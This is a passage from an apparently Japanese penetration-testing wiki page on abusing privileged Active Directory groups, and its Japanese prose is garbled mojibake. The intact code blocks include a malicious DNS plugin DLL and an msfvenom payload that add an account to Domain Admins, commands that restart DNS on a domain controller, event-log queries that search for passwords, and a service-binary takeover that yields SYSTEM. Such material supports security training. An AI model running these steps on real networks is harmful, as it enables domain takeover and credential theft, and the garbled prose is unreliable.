æœ‰åŠ¹ãªDLLã®ä¾‹ã¯[https://github.com/kazkansouh/DNSAdmin-DLL](https://github.com/kazkansouh/DNSAdmin-DLL)ã«ã‚ã‚Šã¾ã™ã€‚`DnsPluginInitialize`é–¢æ•°ã®ã‚³ãƒ¼ãƒ‰ã‚’ä»¥ä¸‹ã®ã‚ˆã†ã«å¤‰æ›´ã—ã¾ã™ï¼š
```c
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```
ã¾ãŸã¯ã€msfvenomã‚’ä½¿ç”¨ã—ã¦dllã‚’ç”Ÿæˆã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
ã—ãŸãŒã£ã¦ã€**DNSã‚µãƒ¼ãƒ“ã‚¹**ãŒé–‹å§‹ã¾ãŸã¯å†èµ·å‹•ã•ã‚Œã‚‹ã¨ã€æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒä½œæˆã•ã‚Œã¾ã™ã€‚

DNSAdminã‚°ãƒ«ãƒ¼ãƒ—å†…ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã„ã¦ã‚‚ã€**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯DNSã‚µãƒ¼ãƒ“ã‚¹ã‚’åœæ­¢ãŠã‚ˆã³å†èµ·å‹•ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚** ãŸã ã—ã€å¸¸ã«æ¬¡ã®æ“ä½œã‚’è©¦ã™ã“ã¨ãŒã§ãã¾ã™:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
[**ã“ã®ç‰¹æ¨©æ˜‡æ ¼ã«ã¤ã„ã¦ã®è©³ç´°ã¯ã€ired.teamã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)

#### Mimilib.dll

ã“ã®[**æŠ•ç¨¿**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)ã§è©³ã—ãèª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€`Mimikatz`ãƒ„ãƒ¼ãƒ«ã®ä½œæˆè€…ã«ã‚ˆã‚‹[**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)ã‚’ä½¿ç”¨ã—ã¦ã€[**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c)ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**å¤‰æ›´**ã—ã¦ã€ãƒªãƒãƒ¼ã‚¹ã‚·ã‚§ãƒ«ã®ãƒ¯ãƒ³ãƒ©ã‚¤ãƒŠãƒ¼ã‚„ä»–ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

### MitMã®ãŸã‚ã®WPADãƒ¬ã‚³ãƒ¼ãƒ‰

DnsAdminsã‚°ãƒ«ãƒ¼ãƒ—ã®ç‰¹æ¨©ã‚’æ‚ªç”¨ã™ã‚‹åˆ¥ã®æ–¹æ³•ã¯ã€**WPADãƒ¬ã‚³ãƒ¼ãƒ‰**ã‚’ä½œæˆã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã®ã‚°ãƒ«ãƒ¼ãƒ—ã«æ‰€å±ã™ã‚‹ã“ã¨ã§ã€[ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚¯ã‚¨ãƒªãƒ–ãƒ­ãƒƒã‚¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚’ç„¡åŠ¹åŒ–](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps)ã™ã‚‹æ¨©é™ãŒä¸ãˆã‚‰ã‚Œã¾ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€ã“ã®æ”»æ’ƒã‚’ãƒ–ãƒ­ãƒƒã‚¯ã™ã‚‹ãŸã‚ã«ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚¯ã‚¨ãƒªãƒ–ãƒ­ãƒƒã‚¯ãƒªã‚¹ãƒˆãŒä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã‚µãƒ¼ãƒãƒ¼2008ã§ã¯ã€DNSã‚µãƒ¼ãƒãƒ¼ã«ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚¯ã‚¨ãƒªãƒ–ãƒ­ãƒƒã‚¯ãƒªã‚¹ãƒˆã‚’è¿½åŠ ã™ã‚‹æ©Ÿèƒ½ãŒåˆã‚ã¦å°å…¥ã•ã‚Œã¾ã—ãŸã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€Web Proxy Automatic Discovery Protocol (WPAD)ã¨Intra-site Automatic Tunnel Addressing Protocol (ISATAP)ãŒã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚¯ã‚¨ãƒªãƒ–ãƒ­ãƒƒã‚¯ãƒªã‚¹ãƒˆã«å«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¯ãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯ã®è„†å¼±æ€§ãŒéå¸¸ã«é«˜ãã€ä»»æ„ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã“ã‚Œã‚‰ã®åå‰ã‚’å«ã‚€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚„DNSãƒ¬ã‚³ãƒ¼ãƒ‰ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

**ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚¯ã‚¨ãƒªãƒ–ãƒ­ãƒƒã‚¯ãƒªã‚¹ãƒˆã‚’ç„¡åŠ¹åŒ–**ã—ã€**WPADãƒ¬ã‚³ãƒ¼ãƒ‰ã‚’ä½œæˆ**ã—ãŸå¾Œã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆè¨­å®šã§å‹•ä½œã—ã¦ã„ã‚‹ã™ã¹ã¦ã®WPADã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹ãƒã‚·ãƒ³ã®ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã¯ã€**æ”»æ’ƒãƒã‚·ãƒ³ã‚’ä»‹ã—ã¦ãƒ—ãƒ­ã‚­ã‚·ã•ã‚Œã¾ã™**ã€‚[Responder](https://github.com/lgandx/Responder)ã‚„[Inveigh](https://github.com/Kevin-Robertson/Inveigh)ãªã©ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®ã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°ã‚’è¡Œã„ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒƒã‚·ãƒ¥ã‚’ã‚­ãƒ£ãƒ—ãƒãƒ£ã—ã¦ã‚ªãƒ•ãƒ©ã‚¤ãƒ³ã§ã‚¯ãƒ©ãƒƒã‚¯ã—ãŸã‚Šã€SMBRelayæ”»æ’ƒã‚’å®Ÿè¡Œã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## ã‚¤ãƒ™ãƒ³ãƒˆãƒ­ã‚°ã®èª­ã¿å–ã‚Šè€…

[**ã‚¤ãƒ™ãƒ³ãƒˆãƒ­ã‚°ã®èª­ã¿å–ã‚Šè€…**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers)ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã¯ã€ç”Ÿæˆã•ã‚ŒãŸã‚¤ãƒ™ãƒ³ãƒˆãƒ­ã‚°ï¼ˆæ–°ã—ã„ãƒ—ãƒ­ã‚»ã‚¹ä½œæˆãƒ­ã‚°ãªã©ï¼‰ã«**ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹æ¨©é™**ã‚’æŒã£ã¦ã„ã¾ã™ã€‚ãƒ­ã‚°ã«ã¯**æ©Ÿå¯†æƒ…å ±**ãŒå«ã¾ã‚Œã¦ã„ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ãƒ­ã‚°ã®è¡¨ç¤ºæ–¹æ³•ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ï¼š
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Event Log Readers"

# To find "net [...] /user:blahblah password"
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# Using other users creds
wevtutil qe Security /rd:true /f:text /r:share01 /u:<username> /p:<pwd> | findstr "/user"

# Search using PowerShell
Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```
## Exchange Windows Permissions

ãƒ¡ãƒ³ãƒãƒ¼ã¯ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«**DACLã‚’æ›¸ãè¾¼ã‚€æ¨©é™**ã‚’ä¸ãˆã‚‰ã‚Œã¦ã„ã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã“ã‚Œã‚’æ‚ªç”¨ã—ã¦ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«[**DCSync**](dcsync.md)ã®ç‰¹æ¨©ã‚’ä¸ãˆã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
Microsoft ExchangeãŒADç’°å¢ƒã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹å ´åˆã€ã“ã®ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã¨ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚„ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãƒ¼ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒä¸€èˆ¬çš„ã§ã™ã€‚

ã“ã®[**GitHubãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/gdedrouas/Exchange-AD-Privesc)ã§ã¯ã€ã“ã®ã‚°ãƒ«ãƒ¼ãƒ—ã®æ¨©é™ã‚’æ‚ªç”¨ã—ã¦ç‰¹æ¨©ã‚’ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã™ã‚‹ãŸã‚ã®ã„ãã¤ã‹ã®**æŠ€è¡“**ãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚
```powershell
#Get members of the group
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-Vç®¡ç†è€…

[**Hyper-Vç®¡ç†è€…**](https://docs.microsoft.com/ja-jp/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators)ã‚°ãƒ«ãƒ¼ãƒ—ã¯ã€ã™ã¹ã¦ã®[Hyper-Væ©Ÿèƒ½](https://docs.microsoft.com/ja-jp/windows-server/manage/windows-admin-center/use/manage-virtual-machines)ã«å®Œå…¨ãªã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã£ã¦ã„ã¾ã™ã€‚**ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼**ãŒ**ä»®æƒ³åŒ–**ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**ä»®æƒ³åŒ–ç®¡ç†è€…**ã¯**ãƒ‰ãƒ¡ã‚¤ãƒ³ç®¡ç†è€…**ã¨è¦‹ãªã•ã‚Œã‚‹ã¹ãã§ã™ã€‚å½¼ã‚‰ã¯ç°¡å˜ã«**ãƒ©ã‚¤ãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ã®ã‚¯ãƒ­ãƒ¼ãƒ³**ã‚’ä½œæˆã—ã€ä»®æƒ³ãƒ‡ã‚£ã‚¹ã‚¯ã‚’ã‚ªãƒ•ãƒ©ã‚¤ãƒ³ã§**ãƒã‚¦ãƒ³ãƒˆ**ã—ã¦**`NTDS.dit`**ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å–å¾—ã—ã€ãƒ‰ãƒ¡ã‚¤ãƒ³å†…ã®ã™ã¹ã¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®NTLMãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒãƒƒã‚·ãƒ¥ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã¾ãŸã€ã“ã®[ãƒ–ãƒ­ã‚°](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/)ã§è©³ã—ãèª¬æ˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€ä»®æƒ³ãƒã‚·ãƒ³ã‚’**å‰Šé™¤**ã™ã‚‹ã¨ã€`vmms.exe`ã¯å¯¾å¿œã™ã‚‹**`.vhdx`ãƒ•ã‚¡ã‚¤ãƒ«**ã®å…ƒã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ã‚¯ã‚»ã‚¹è¨±å¯ã‚’**NT AUTHORITY\SYSTEM**ã¨ã—ã¦**å¾©å…ƒ**ã—ã‚ˆã†ã¨ã—ã¾ã™ãŒã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’å½è£…ã—ã¾ã›ã‚“ã€‚ç§ãŸã¡ã¯**`.vhdx`**ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**å‰Šé™¤**ã—ã€ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**ä¿è­·ã•ã‚ŒãŸSYSTEMãƒ•ã‚¡ã‚¤ãƒ«**ã«å‘ã‘ã‚‹ãŸã‚ã®ãƒã‚¤ãƒ†ã‚£ãƒ–ãª**ãƒãƒ¼ãƒ‰ãƒªãƒ³ã‚¯**ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã™ã‚‹ã¨ã€å®Œå…¨ãªã‚¢ã‚¯ã‚»ã‚¹æ¨©ãŒä¸ãˆã‚‰ã‚Œã¾ã™ã€‚

ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ãŒ[CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952)ã¾ãŸã¯[CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841)ã«å¯¾ã—ã¦è„†å¼±ã§ã‚ã‚‹å ´åˆã€ã“ã‚Œã‚’åˆ©ç”¨ã—ã¦SYSTEMç‰¹æ¨©ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãã‚Œä»¥å¤–ã®å ´åˆã€ç‰¹æ¨©ã®ãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒèµ·å‹•ã§ãã‚‹**SYSTEMã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§å®Ÿè¡Œã•ã‚Œã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦ã„ã‚‹ã‚µãƒ¼ãƒãƒ¼ä¸Šã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’åˆ©ç”¨**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### **æ”»æ’ƒä¾‹**

ã“ã®ä¾‹ã§ã¯ã€**Firefox**ãŒ**`Mozilla Maintenance Service`**ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚[ã“ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1)ï¼ˆNTãƒãƒ¼ãƒ‰ãƒªãƒ³ã‚¯ã®æ¦‚å¿µè¨¼æ˜ï¼‰ã‚’æ›´æ–°ã—ã¦ã€ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ä»¥ä¸‹ã®ãƒ•ã‚¡ã‚¤ãƒ«ã®å®Œå…¨ãªã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’ä»˜ä¸ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **ãƒ•ã‚¡ã‚¤ãƒ«ã®æ‰€æœ‰æ¨©ã‚’å–å¾—ã™ã‚‹**

PowerShellã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã—ãŸå¾Œã€**ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã®å®Œå…¨ãªåˆ¶å¾¡æ¨©ã‚’æŒã¡ã€æ‰€æœ‰æ¨©ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã¯ãšã§ã™**ã€‚
```bash
C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```
#### **Mozillaãƒ¡ãƒ³ãƒ†ãƒŠãƒ³ã‚¹ã‚µãƒ¼ãƒ“ã‚¹ã®é–‹å§‹**

æ¬¡ã«ã€ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’**æ‚ªæ„ã®ã‚ã‚‹`maintenanceservice.exe`**ã§ç½®ãæ›ãˆã€ãƒ¡ãƒ³ãƒ†ãƒŠãƒ³ã‚¹ã‚µãƒ¼ãƒ“ã‚¹ã‚’**é–‹å§‹**ã—ã€SYSTEMã¨ã—ã¦ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œã‚’è¡Œã„ã¾ã™ã€‚
```
C:\htb> sc.exe start MozillaMaintenance
```
{% hint style="info" %}
ã“ã®ãƒ™ã‚¯ãƒˆãƒ«ã¯ã€ãƒãƒ¼ãƒ‰ãƒªãƒ³ã‚¯ã«é–¢é€£ã™ã‚‹å‹•ä½œã‚’å¤‰æ›´ã—ãŸ2020å¹´3æœˆã®Windowsã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æ›´æ–°ã«ã‚ˆã£ã¦è»½æ¸›ã•ã‚Œã¾ã—ãŸã€‚
{% endhint %}

## çµ„ç¹”ç®¡ç†

ã“ã®ã‚°ãƒ«ãƒ¼ãƒ—ã¯ã€**Microsoft Exchange**ãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸç’°å¢ƒã§ã‚‚å­˜åœ¨ã—ã¾ã™ã€‚\
ã“ã®ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã¯ã€**ã™ã¹ã¦ã®**ãƒ‰ãƒ¡ã‚¤ãƒ³ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®**ãƒ¡ãƒ¼ãƒ«ãƒœãƒƒã‚¯ã‚¹**ã«**ã‚¢ã‚¯ã‚»ã‚¹**ã§ãã¾ã™ã€‚\
ã“ã®ã‚°ãƒ«ãƒ¼ãƒ—ã¯ã¾ãŸã€ã‚°ãƒ«ãƒ¼ãƒ—[**`Exchange Windows Permissions`**](privileged-groups-and-token-privileges.md#exchange-windows-permissions)ã‚’å«ã‚€OU `Microsoft Exchange Security Groups`ã®**å®Œå…¨ãªåˆ¶å¾¡**ã‚’æŒã£ã¦ã„ã¾ã™ï¼ˆã“ã®ã‚°ãƒ«ãƒ¼ãƒ—ã‚’æ‚ªç”¨ã—ã¦ç‰¹æ¨©æ˜‡æ ¼ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã¯ãƒªãƒ³ã‚¯ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼‰ã€‚

## ãƒ—ãƒªãƒ³ãƒˆã‚ªãƒšãƒ¬ãƒ¼ã‚¿

ã“ã®ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã«ã¯ä»¥ä¸‹ãŒä»˜ä¸ã•ã‚Œã¾ã™ï¼š

* [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
* **ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ã«ãƒ­ãƒ¼ã‚«ãƒ«ã§ãƒ­ã‚°ã‚ªãƒ³**ã—ã€ã‚·ãƒ£ãƒƒãƒˆãƒ€ã‚¦ãƒ³ã™ã‚‹æ¨©é™
* ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ã«æ¥ç¶šã•ã‚ŒãŸ**ãƒ—ãƒªãƒ³ã‚¿**ã®**ç®¡ç†**ã€ä½œæˆã€å…±æœ‰ã€å‰Šé™¤ã®æ¨©é™

{% hint style="warning" %}
ã‚³ãƒãƒ³ãƒ‰`whoami /priv`ãŒæ˜‡æ ¼ã—ã¦ã„ãªã„ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§**`SeLoadDriverPrivilege`**ã‚’è¡¨ç¤ºã—ãªã„å ´åˆã€UACã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

ã‚°ãƒ«ãƒ¼ãƒ—ã®**ãƒ¡ãƒ³ãƒãƒ¼**ã‚’å–å¾—ã™ã‚‹ï¼š
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
ã“ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€SeLoadDriverPrivilegeã‚’æ‚ªç”¨ã—ã¦ç‰¹æ¨©æ˜‡æ ¼ã‚’è¡Œã†æ–¹æ³•ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã™ï¼š

{% content-ref url="../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md" %}
[abuse-seloaddriverprivilege.md](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md)
{% endcontent-ref %}

## ãƒªãƒ¢ãƒ¼ãƒˆãƒ‡ã‚¹ã‚¯ãƒˆãƒƒãƒ—ãƒ¦ãƒ¼ã‚¶ãƒ¼

ã“ã®ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã¯RDPçµŒç”±ã§PCã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚\
ã‚°ãƒ«ãƒ¼ãƒ—ã®**ãƒ¡ãƒ³ãƒãƒ¼**ã‚’å–å¾—ã™ã‚‹ï¼š
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
**RDP**ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±:

{% content-ref url="../../network-services-pentesting/pentesting-rdp.md" %}
[pentesting-rdp.md](../../network-services-pentesting/pentesting-rdp.md)
{% endcontent-ref %}

## ãƒªãƒ¢ãƒ¼ãƒˆç®¡ç†ãƒ¦ãƒ¼ã‚¶ãƒ¼

ã“ã®ã‚°ãƒ«ãƒ¼ãƒ—ã®ãƒ¡ãƒ³ãƒãƒ¼ã¯**WinRM**ã‚’ä»‹ã—ã¦PCã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ã€‚
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM**ã«ã¤ã„ã¦ã®è©³ç´°æƒ…å ±ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

{% content-ref url="../../network-services-pentesting/5985-5986-pentesting-winrm.md" %}
[5985-5986-pentesting-winrm.md](../../network-services-pentesting/5985-5986-pentesting-winrm.md)
{% endcontent-ref %}

## ã‚µãƒ¼ãƒãƒ¼ã‚ªãƒšãƒ¬ãƒ¼ã‚¿ãƒ¼ <a href="#server-operators" id="server-operators"></a>

ã“ã®ãƒ¡ãƒ³ãƒãƒ¼ã‚·ãƒƒãƒ—ã«ã‚ˆã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ä»¥ä¸‹ã®ç‰¹æ¨©ã‚’æŒã¤ãƒ‰ãƒ¡ã‚¤ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ãƒ¼ã‚’æ§‹æˆã§ãã¾ã™ï¼š

* ãƒ­ãƒ¼ã‚«ãƒ«ã§ã®ãƒ­ã‚°ã‚ªãƒ³ã‚’è¨±å¯ã™ã‚‹
* ãƒ•ã‚¡ã‚¤ãƒ«ã¨ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®ãƒãƒƒã‚¯ã‚¢ãƒƒãƒ—
* \`\`[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) ãŠã‚ˆã³ [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)
* ã‚·ã‚¹ãƒ†ãƒ ã®æ™‚åˆ»ã®å¤‰æ›´
* ã‚¿ã‚¤ãƒ ã‚¾ãƒ¼ãƒ³ã®å¤‰æ›´
* ãƒªãƒ¢ãƒ¼ãƒˆã‚·ã‚¹ãƒ†ãƒ ã‹ã‚‰ã®å¼·åˆ¶ã‚·ãƒ£ãƒƒãƒˆãƒ€ã‚¦ãƒ³
* ãƒ•ã‚¡ã‚¤ãƒ«ã¨ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®å¾©å…ƒ
* ã‚·ã‚¹ãƒ†ãƒ ã®ã‚·ãƒ£ãƒƒãƒˆãƒ€ã‚¦ãƒ³
* ãƒ­ãƒ¼ã‚«ãƒ«ã‚µãƒ¼ãƒ“ã‚¹ã®åˆ¶å¾¡

ã‚°ãƒ«ãƒ¼ãƒ—ã®**ãƒ¡ãƒ³ãƒãƒ¼**ã‚’å–å¾—ã™ã‚‹ï¼š
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## å‚è€ƒæ–‡çŒ® <a href="#references" id="references"></a>

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}

{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13" %}

{% embed url="https://github.com/tandasat/ExploitCapcom" %}

{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" %}

{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" %}

{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}

{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}

<details>

